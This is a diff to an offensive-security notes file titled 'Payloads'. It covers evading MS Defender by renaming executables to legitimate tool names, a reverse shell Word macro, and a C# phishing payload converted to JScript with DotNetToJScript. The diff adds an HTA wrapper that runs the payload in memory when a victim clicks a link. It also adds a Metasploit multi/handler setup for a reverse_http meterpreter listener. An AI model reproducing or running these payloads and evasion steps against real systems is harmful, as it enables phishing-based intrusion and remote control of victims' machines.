@@ -1,8 +1,8 @@
 # Payloads
 
 * [Bypass MS Defender](#bypass-ms-defender)
-* [Reverse Shell MS Word Macro](#reverse-shell-ms-word-macro) / DETECTED
-* [C# Payload with HTA and JScript](#csharp-payload-with-hta-and-jscript)
+* [Reverse Shell MS Word Macro (Detected)](#reverse-shell-ms-word-macro-detected) 
+* [C# Phishing Payload with HTA and JScript](#csharp-payload-with-hta-and-jscript)
 
 # Bypass MS Defender 
 
@@ -20,7 +20,7 @@ Rename the final executable. Use offical appilcation names like: procexp64
 .\procexp64.exe
 ```
 
-# Reverse Shell MS Word Macro
+# Reverse Shell MS Word Macro (Detected)
 
 Complete PowerShell script for in-memory shellcode runner
 
@@ -91,10 +91,20 @@ After building, create the JScript payload.
 DotNetToJScript.exe ExampleAssembly.dll --lang=JScript --ver=v4 -o payload.js
 ```
 
-Create a skeleton .HTA file with JScript tags
+> Create a skeleton .HTA file with JScript tags. When the victim clicks on the link, the file will be downloaded and executed in-memory.
 
-```shell
-# To add
+```js
+<head>
+<script language="JScript">
+<Generated payload.js JScript Content Here>
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
 ```
 
 > Listen with multi/handler meterpreter
@@ -103,7 +113,7 @@ Create a skeleton .HTA file with JScript tags
 msfconsole -q
 use multi/handler
 set payload windows/x64/meterpreter/reverse_http
-set lhost 192.168.0.203
+set lhost kali
 set lport 443
 run
 ```
